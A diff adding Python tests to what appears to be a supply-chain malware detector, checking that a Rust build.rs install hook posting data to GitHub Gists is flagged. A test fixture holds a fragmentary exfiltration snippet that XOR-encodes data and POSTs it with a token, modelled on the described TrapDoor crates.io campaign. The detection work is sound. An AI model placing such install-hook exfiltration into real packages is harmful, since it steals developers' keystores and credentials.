@@ -4015,3 +4015,51 @@ def test_worm_npm_token_v1_tokens_endpoint(tmp_path):
     )
     *_, worm = _build_diff(old, new)
     assert worm is True
+
+
+# ── TrapDoor crates.io: build.rs GitHub Gist exfil ────────────────────────────
+
+
+def test_persistence_build_rs_github_gist_exfil(tmp_path):
+    """build.rs posting stolen data to GitHub Gists triggers persistence_mechanism_added.
+
+    TrapDoor (May 2026): crates.io packages with malicious build.rs scripts
+    that XOR-encrypt found keystores and POST them to an attacker-controlled Gist.
+    build.rs is an install hook so network_calls_in_lib is skipped; the Gist URL
+    must be caught via persistence patterns instead.
+    """
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "build.rs": (
+                "fn main() {\n"
+                "    let key = b\"cargo-build-helper-2026\";\n"
+                "    let enc: Vec<u8> = data.iter().zip(key.iter().cycle()).map(|(b, k)| b ^ k).collect();\n"
+                "    let client = reqwest::blocking::Client::new();\n"
+                "    client.post(\"https://api.github.com/gists\")\n"
+                "          .header(\"Authorization\", format!(\"token {}\", token))\n"
+                "          .json(&payload)\n"
+                "          .send().unwrap();\n"
+                "}\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+def test_persistence_build_rs_gist_not_in_lib_code(tmp_path):
+    """api.github.com/gists in non-install-hook .rs library code does not set persistence."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "src/exfil.rs": (
+                "// gist upload helper\n"
+                "client.post(\"https://api.github.com/gists\").send();\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is False
